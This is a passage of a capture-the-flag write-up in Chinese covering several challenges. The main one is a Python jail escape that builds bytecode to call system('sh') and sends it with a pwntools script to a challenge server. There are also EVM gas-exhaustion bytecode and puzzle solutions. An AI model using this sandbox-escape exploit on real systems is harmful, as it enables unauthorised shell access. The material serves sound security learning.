wrap = sub[133] # os._wrap_close
init = wrap.__init__
glb = init.__globals__
glb["system"]("sh")
```

getattribute:  a.__class__.__dict__["__getattribute__"](a, "attr")

中间变量可以存到 __class__ 和 __dict__ 这俩name里



Bool: [] == [], [] != []

Int: False+False -> 0, False+True -> 1

更大的数字可以用1加出来

Str: f"{xxx}"

f"{''.__class__.__dict__}" 含有所有要用的字符，但一个一个字符拼起来代码太长了

可以找包含子串的字符串

f"{''.__class__.__class__.__dict__}" 包含 __base__, __subclassess__, __init__, __getattribute__

f"{init.__class__.__dict__}" 包含 __globals__

f"{glb}" 包含 system 和 sh



init.__class__.__dict__["__getattribute__"] 不能用。。但是可以找到attrgetter

```
attrgetter = [ x for x in ''.__class__.__base__.__subclasses__() if "operator.attrgetter" in str(x) ][0]
```

远程环境subclasses下标不一样，可以抛出异常来输出信息 {}[f"{sub}"]

最后 os._wrap_close 下标是 133，attrgetter 下标是 148



```
import types
import dis
import os
import sys
from opcode import opmap, cmp_op

gift1 = 'class'
gift2 = 'dict'


def gen_None():
    return \
        bytes([opmap["BUILD_LIST"], 0]) + \
        get_class() + \
        get_dict() + \
        gen_string("clear") + \
        bytes([opmap["BINARY_SUBSCR"], 0]) + \
        bytes([opmap["BUILD_LIST"], 0]) + \
        call_function(1)

def gen_return():
    return bytes([opmap["RETURN_VALUE"], 0])

def get_class():
    return bytes([opmap["LOAD_ATTR"], 0])

def get_dict():
    return bytes([opmap["LOAD_ATTR"], 1])

def gen_true():
    return \
        gen_empty_str() + \
        gen_empty_str() + \
        bytes([opmap["COMPARE_OP"], cmp_op.index("==")])

def gen_false():
    return \
        gen_empty_str() + \
        gen_empty_str() + \
        bytes([opmap["COMPARE_OP"], cmp_op.index("!=")])

def gen_zero():
    return \
        gen_false() + \
        gen_false() + \
        bytes([opmap["BINARY_ADD"], 0])

def gen_one():
    return \
        gen_true() + \
        gen_false() + \
        bytes([opmap["BINARY_ADD"], 0])

def dup_top():
    return bytes([opmap["DUP_TOP"], 0])

def gen_int(x: int):
    if x == 0:
        return gen_zero()
    if x < 0:
        return gen_int(-x) + bytes([opmap["UNARY_NEGATIVE"], 0])
    b = bin(x)[2:]
    b = b[::-1]
    n = len(b)
    ans = gen_one()
    for i in range(n-1):
        if b[i] == '1':
            ans += dup_top()
        ans += dup_top()
        ans += bytes([opmap["BINARY_ADD"], 0])
    for i in range(n-1):
        if b[i] == '1':
            ans += bytes([opmap["BINARY_ADD"], 0])
    return ans

def gen_empty_str():
    return bytes([opmap["BUILD_STRING"], 0])

def gen_char(c):
    s = f"{''.__class__.__dict__}"
    if c not in s:
        raise ValueError()
    idx = s.index(c)
    return \
        gen_empty_str() + \
        get_class() + \
        get_dict() + \
        bytes([opmap["FORMAT_VALUE"], 1]) + \
        gen_int(idx) + \
        bytes([opmap["BINARY_SUBSCR"], 0])

def gen_string(helper, s: str):
    hint, code = helper()
    shint = f'{hint}'
    idx = shint.find(s)
    return code + \
        bytes([opmap["FORMAT_VALUE"], 1]) + \
        gen_int(idx) + \
        gen_int(idx + len(s)) + \
        bytes([opmap["BUILD_SLICE"], 2]) + \
        bytes([opmap["BINARY_SUBSCR"], 0])

def str_helper1():
    # __base__, __subclassess__, __init__, __getattribute__
    hint = ''.__class__.__class__.__dict__
    code = \
        gen_empty_str() + \
        get_class() + \
        get_class() + \
        get_dict()
    return hint, code

def str_helper2(ini = None):
    # __globals__
    hint = os._wrap_close.__init__.__class__.__dict__
    code = \
        b"" + \
        get_class() + \
        get_dict()
    return hint, code

def str_helper3(glb = None):
    # system, sh
    hint = os._wrap_close.__init__.__globals__
    code = b""
    return hint, code

def call_method(x):
    return bytes([opmap["CALL_METHOD"], x])

def call_function(x):
    return bytes([opmap["CALL_FUNCTION"], x])

def save_var(x = 1):
    return bytes([opmap["STORE_NAME"], x])

def load_var(x = 1):
    return bytes([opmap["LOAD_NAME"], x])

def binary_subscr():
    return bytes([opmap["BINARY_SUBSCR"], 0])


def gen_char(c):
    s = f"{''.__class__.__dict__}"
    if c not in s:
        raise ValueError()
    idx = s.index(c)
    return \
        gen_empty_str() + \
        get_class() + \
        get_dict() + \
        bytes([opmap["FORMAT_VALUE"], 1]) + \
        gen_int(idx) + \
        bytes([opmap["BINARY_SUBSCR"], 0])


def gen_string_old(s:str):
    if len(s) == 0:
        return gen_empty_str()
    ans = gen_char(s[0])
    for x in s[1:]:
        ans += gen_char(x)
        ans += bytes([opmap["BINARY_ADD"], 0])
    return ans


def get_code():
    code = b""

    # <class 'object'>
    code += gen_empty_str()
    code += get_class()
    code += get_class()
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += gen_empty_str()
    code += get_class()
    code += gen_string(str_helper1, '__base__')
    code += call_function(2)

    # object.__subclassess__()
    code += save_var(1)
    code += load_var(1)
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += load_var(1)
    code += gen_string(str_helper1, '__subclasses__')
    code += call_function(2)
    code += call_function(0)

    # save subclasses
    code += save_var(0)

    """
    # exception
    code += bytes([opmap["BUILD_MAP"], 0])
    code += load_var(0)
    code += bytes([opmap["FORMAT_VALUE"], 1])
    code += binary_subscr()
    """

    # <class 'os._wrap_close'>
    code += load_var(0)
    code += gen_int(133) # 133
    code += binary_subscr()

    # _wrap_close.__init__
    code += save_var(1)
    code += load_var(1)
    code += get_class()
    code += get_dict()
    code += gen_string(str_helper1, '__getattribute__')
    code += binary_subscr()
    code += load_var(1)
    code += gen_string(str_helper1, '__init__')
    code += call_function(2)

    # __globals__
    code += save_var(1) # save init
    code += load_var(0) # load attrgetter
    code += gen_int(148) # 168
    code += binary_subscr() # attrgetter
    code += load_var(1) # load init
    code += gen_string(str_helper2, '__globals__')
    code += call_function(1)
    code += load_var(1) # load init
    code += call_function(1)

    # globals["system"]("sh")
    code += save_var(1)
    code += load_var(1)
    code += load_var(1)
    code += gen_string(str_helper3, "system")
    code += bytes([opmap["BINARY_SUBSCR"], 0])

    #code += load_var(1)
    code += gen_string_old("sh")

    code += call_function(1)

    code += gen_return()
    #print(''.join("%02x" % x for x in code))
    #dis.dis(code)
    #print(len(code))
    #print()
    assert len(code) <= 2000
    hex_code = ''.join('%02x' % x for x in code)
    return hex_code

from pwn import *

context.log_level = "debug"

code = get_code()
r = remote("111.186.58.164", 13337)
r.recvuntil("in hex", timeout=1)
r.recvuntil("in hex", timeout=1)
r.sendline(code)
r.recvuntil("gift1", timeout=1)
r.sendline("class")
r.recvuntil("gift2", timeout=1)
r.sendline("dict")
r.interactive()
```

### Singer

题目的附件

```
A6-D#6
G#6
G6
G6
G#6
A6-D#6

C6-G5
F#5
F#5
C6-G5

A6-F#6,D#6
A6,F#6,D#6
A6,F#6-D#6

A6,D#6
A6-D#6
A6,D#6

F#7-C7
E7-D7
F7,C#7
F#7,C7

E6,A#5
E6-A#5
E6,A#5

A6-D#6
A6-G6
F#6-E6
A6-D#6
```

这里我们用FL Stdio进行一下模拟

文本出现的内容的数据范围都在C5——C7之间

![img](./pngs/fl1.png)

然后根据其对应的情况进行绘图

其中'-'代表一个范围的数据 而','代码在同一列的位置

这里从第一段数据入手

```
A6-D#6
G#6
G6
G6
G#6
A6-D#6
```

一行数据可以画为一列

![img](./pngs/fl2.png)

这样就画出的大写的M

通过第三组数据:

```
A6-F#6,D#6
A6,F#6,D#6
A6,F#6-D#6
```

依次进行对应的绘图操作 

![img](./pngs/fl3.png)

即可得到大写的S

根据组的顺序进行绘图

即可得到

![img](./pngs/fl4.png)

得到:MUSIKING

同时题目要求flag为小写字母,将其转为小写 最后的flag为flag{musiking}

> special format: flag{[a-z]*}

### gas machine

将gas通过构造的指令消耗完即可，runtime bytecode长度只要小于100即可

```
# 0x00
s = '5b'         # jumpdest                    1
s += '6050'       # push1 0x50     3
s += '5a'         # gas            2
s += '11'         # GT             3
s += '6000'       # push1 0x00     3
s += '57'         # jumpi         10

# 0x08
s += '5a'         # gas                   2
s += '606b'       # push1 0x6b            3
s += '03'         # sub                   3
s += '56'         # jump                  8
s += '5b'*0x50    # jumpdest*50          1
s += '00'         # stop

print(s)

# 107 - 30 = 77
# 93 - 16 = 77
```


![img](./pngs/gas_exp.png)

### GutHib

通过 https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events 拿到commit id

然后直球访问 https://github.com/awesome-ctf/TCTF2021-Guthib/tree/da883505ed6754f328296cac1ddb203593473967 即可看到flag
